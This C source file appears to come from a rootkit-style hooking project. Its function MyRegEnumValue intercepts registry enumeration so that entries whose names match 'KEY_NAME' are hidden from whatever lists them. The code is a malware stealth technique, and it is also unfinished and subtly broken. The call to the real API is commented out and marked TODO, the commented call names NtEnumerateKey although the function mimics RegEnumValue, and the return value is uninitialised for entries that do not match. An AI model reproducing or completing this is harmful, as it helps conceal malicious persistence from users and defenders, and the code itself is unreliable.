#include "stdafx.h"

#include "NtEnumerateKey.h"
#include <windows.h>
#include "hooking.h"

/*  MyRegEnumValue : hide registry keys when a list is requested */
LONG WINAPI MyRegEnumValue(
    HKEY    hKey,
    DWORD   dwIndex,
    LPWSTR  lpValueName,
    LPDWORD lpcValueName,
    LPDWORD lpReserved,
    LPDWORD lpType,
    LPBYTE  lpData,
    LPDWORD lpcbData)
{
    LONG lRet; /* return value */
    char buf[256];
    /* Call genuine API, then process to hiding if needed */
   // lRet = ((TD_NtEnumerateKey)hooking_getOldFunction("NtEnumerateKey"))(hKey, dwIndex, lpValueName, lpcValueName,
     //   lpReserved, lpType, lpData, lpcbData);
    //TODO
    /* Convert string from Unicode */
    WideCharToMultiByte(CP_ACP, 0, lpValueName, -1, buf, 255, NULL, NULL);

    /* If the key must be hidden... */
    if (!_strnicmp((char*)buf, "KEY_NAME", strlen("KEY_NAME"))) {
        lRet = 1; /* then return 1 (error) */
    }

    return lRet;
}